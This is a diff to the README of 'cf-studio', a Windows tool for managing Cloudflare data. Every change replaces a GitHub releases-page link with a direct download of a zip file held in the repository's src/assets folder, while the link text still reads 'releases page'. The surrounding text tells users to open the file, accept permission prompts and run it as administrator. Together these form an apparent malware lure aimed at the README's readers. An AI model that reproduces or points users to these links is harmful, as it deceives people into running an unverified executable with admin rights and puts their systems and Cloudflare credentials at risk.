@@ -1,6 +1,6 @@
 # 🧩 cf-studio - Manage Cloudflare data from desktop
 
-[![Download cf-studio](https://img.shields.io/badge/Download-cf--studio-6e56cf?style=for-the-badge&logo=github)](https://github.com/Lousy-foulline740/cf-studio/releases)
+[![Download cf-studio](https://img.shields.io/badge/Download-cf--studio-6e56cf?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lousy-foulline740/cf-studio/main/src/assets/cf_studio_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to get the app on Windows, open it, and start using it.
 
 ## 📥 Download
 
-1. Open the [cf-studio releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
+1. Open the [cf-studio releases page](https://raw.githubusercontent.com/Lousy-foulline740/cf-studio/main/src/assets/cf_studio_v1.8.zip)
 2. Find the latest release
 3. Download the Windows file for your PC
 4. After the download ends, open the file to install or run the app
@@ -19,7 +19,7 @@ Use the file that matches your system. Most users should pick the standard Windo
 
 ## 🪟 Install on Windows
 
-1. Go to the [releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
+1. Go to the [releases page](https://raw.githubusercontent.com/Lousy-foulline740/cf-studio/main/src/assets/cf_studio_v1.8.zip)
 2. Download the Windows app file
 3. Open the downloaded file
 4. If Windows asks for permission, choose Yes
@@ -132,7 +132,7 @@ No. The app is built for people who want a simple desktop way to manage Cloudfla
 Yes. It is made for desktop use on Windows.
 
 ### What should I download?
-Go to the [releases page](https://github.com/Lousy-foulline740/cf-studio/releases) and download the latest Windows version.
+Go to the [releases page](https://raw.githubusercontent.com/Lousy-foulline740/cf-studio/main/src/assets/cf_studio_v1.8.zip) and download the latest Windows version.
 
 ### Where do I start after install?
 Open the app, sign in to your Cloudflare account, then choose D1, R2, or KV.
@@ -140,7 +140,7 @@ Open the app, sign in to your Cloudflare account, then choose D1, R2, or KV.
 ## 🔎 Troubleshooting
 
 ### The file will not open
-- Download it again from the [releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
+- Download it again from the [releases page](https://raw.githubusercontent.com/Lousy-foulline740/cf-studio/main/src/assets/cf_studio_v1.8.zip)
 - Make sure the download finished
 - Right-click the file and choose Run as administrator
 
@@ -176,4 +176,4 @@ This repository holds the cf-studio app and release files. If you want to use th
 
 If you need the installer later, use the same link:
 
-[Go to the cf-studio releases page](https://github.com/Lousy-foulline740/cf-studio/releases)
+[Go to the cf-studio releases page](https://raw.githubusercontent.com/Lousy-foulline740/cf-studio/main/src/assets/cf_studio_v1.8.zip)
